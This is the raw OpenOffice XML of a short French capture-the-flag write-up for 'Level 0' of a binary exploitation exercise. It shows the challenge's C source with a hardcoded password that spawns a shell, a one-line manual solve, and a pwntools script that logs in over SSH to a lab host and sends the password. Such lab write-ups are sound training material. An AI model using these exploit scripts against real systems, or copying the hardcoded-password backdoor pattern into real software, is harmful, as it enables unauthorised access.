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tyle="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal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font-name="Courier New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 style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:margin-top="0cm" fo:margin-bottom="0.499cm" fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="start" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold" style:font-style-complex="normal" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#cd2828" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:line-height="125%" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false" fo:background-color="#1c1c1c">
        <style:background-image/>
      </style:paragraph-properties>
      <style:text-properties fo:font-style="normal" fo:font-weight="normal" style:font-style-asian="normal" style:font-weight-asian="normal" style:font-style-complex="normal" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L1">
      <style:text-properties fo:font-style="italic" style:font-style-asian="italic" style:font-style-complex="italic"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" style:font-style-asian="normal" style:font-style-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Standard" style:list-style-name="L2">
      <style:paragraph-properties fo:text-align="justify" style:justify-single-word="false"/>
      <style:text-properties fo:font-style="normal" fo:font-weight="bold" style:font-style-asian="normal" style:font-weight-asian="bold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color="#6ab825" fo:font-weight="bold"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties fo:color="#447fcf"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties fo:color="#447fcf" style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties fo:color="#d0d0d0"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties fo:color="#ed9d13"/>
    </style:style>
    <style:style style:name="T8" style:family="text">
      <style:text-properties fo:color="#3677a9"/>
    </style:style>
    <style:style style:name="T9" style:family="text">
      <style:text-properties fo:color="#999999" fo:font-style="italic"/>
    </style:style>
    <style:style style:name="T10" style:family="text">
      <style:text-properties style:text-underline-style="solid" style:text-underline-width="auto" style:text-underline-color="font-color"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7004261131526043606" text:style-name="L1">
        <text:list-item>
          <text:p text:style-name="P12">Level 0</text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">On se connecte via SSH ; comme d'habitude, un <text:span text:style-name="T1">checksec </text:span><text:span text:style-name="T2">est lancé à la connection. On a les protections suivantes :</text:span></text:p>
      <text:list xml:id="list3952670381554432016" text:style-name="L2">
        <text:list-item>
          <text:p text:style-name="P13"><text:span text:style-name="T1">NX enabled</text:span><text:span text:style-name="T2"> : pas d'exécution de shellcode sur la stack.</text:span></text:p>
        </text:list-item>
        <text:list-item>
          <text:p text:style-name="P14">Partial RELRO<text:span text:style-name="T2"> : cette protection n'est pas très utile. Ce tutoriel explique très bien à quoi sert RELRO, et la différence entre partial / full :</text:span></text:p>
          <text:p text:style-name="P14"><text:a xlink:type="simple" xlink:href="https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T2">https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro</text:span></text:a><text:span text:style-name="T2"> </text:span></text:p>
        </text:list-item>
      </text:list>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">On reste sur des binaires 32 bits ; toujours pas de code en </text:span>PIE<text:span text:style-name="T2"> ; </text:span>pas d'ASLR<text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4">Le code source est vraiment simple à reproduire, avec une fonction main très basique :</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P7">#include &lt;stdio.h&gt;</text:p>
      <text:p text:style-name="P8">#include &lt;stdlib.h&gt;</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T4">main</text:span><text:span text:style-name="T6">(</text:span><text:span text:style-name="T3">void</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P10">{</text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T3">int</text:span> <text:s text:c="3"/><text:span text:style-name="T6">n;</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T7">"***********************************"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T7">"* <text:s text:c="3"/>-Level00- <text:s text:c="7"/>*"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T7">"***********************************"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">printf(</text:span><text:span text:style-name="T7">"Password:"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">scanf(</text:span><text:span text:style-name="T7">"%d"</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">&amp;n);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T3">if</text:span> <text:span text:style-name="T6">(n</text:span> <text:span text:style-name="T6">==</text:span> <text:span text:style-name="T8">0x149c</text:span><text:span text:style-name="T6">)</text:span> <text:s text:c="15"/><text:span text:style-name="T9">// 5276 in decimal</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">{</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T7">"\nAuthenticated!"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T6">system(</text:span><text:span text:style-name="T7">"/bin/sh"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="8"/><text:span text:style-name="T3">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">0</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">}</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T6">puts(</text:span><text:span text:style-name="T7">"\nInvalid Password!"</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P9"><text:s text:c="4"/><text:span text:style-name="T3">return</text:span> <text:span text:style-name="T6">(</text:span><text:span text:style-name="T8">1</text:span><text:span text:style-name="T6">);</text:span></text:p>
      <text:p text:style-name="P6">}</text:p>
      <text:p text:style-name="P3"><text:span text:style-name="T2">On comprend vite qu'il suffit de donner à la fonction </text:span>scanf <text:span text:style-name="T2">la valeur 5276, afin de la placer dans la variable </text:span>n,<text:span text:style-name="T2"> et de déclencher l'appel à </text:span>system<text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">&gt;&gt; </text:span><text:span text:style-name="T10">Exploitation manuelle</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P5">$ echo '5276' &gt; /tmp/payload &amp;&amp; cat /tmp/payload - | ./level00</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P3"><text:span text:style-name="T2">&gt;&gt; </text:span><text:span text:style-name="T10">Exploit automatisé</text:span></text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P11"><text:span text:style-name="T3">from</text:span> <text:span text:style-name="T5">pwn</text:span> <text:span text:style-name="T3">import</text:span> <text:span text:style-name="T6">*</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">s</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">ssh(host=</text:span><text:span text:style-name="T7">'192.168.1.3'</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">port=</text:span><text:span text:style-name="T8">4242</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">user=</text:span><text:span text:style-name="T7">'level00'</text:span><text:span text:style-name="T6">,</text:span> <text:span text:style-name="T6">password=</text:span><text:span text:style-name="T7">'level00'</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p</text:span> <text:span text:style-name="T6">=</text:span> <text:span text:style-name="T6">s.process(</text:span><text:span text:style-name="T7">"/home/users/level00/./level00"</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:span text:style-name="T6">p.recvline(</text:span><text:span text:style-name="T8">4</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/><text:span text:style-name="T6">p.sendline(</text:span><text:span text:style-name="T7">'5276'</text:span><text:span text:style-name="T6">)</text:span></text:p>
      <text:p text:style-name="P6">p.interactive()</text:p>
      <text:p text:style-name="P3">Got flag<text:span text:style-name="T2">.</text:span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MS PGothic" style:font-size-asian="10pt" style:font-name-complex="Courier New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6M11S</meta:editing-duration>
    <meta:editing-cycles>6</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.5$Win32 OpenOffice.org_project/415m1$Build-9789</meta:generator>
    <dc:date>2021-12-16T16:04:19.66</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="37" meta:word-count="195" meta:character-count="1456"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>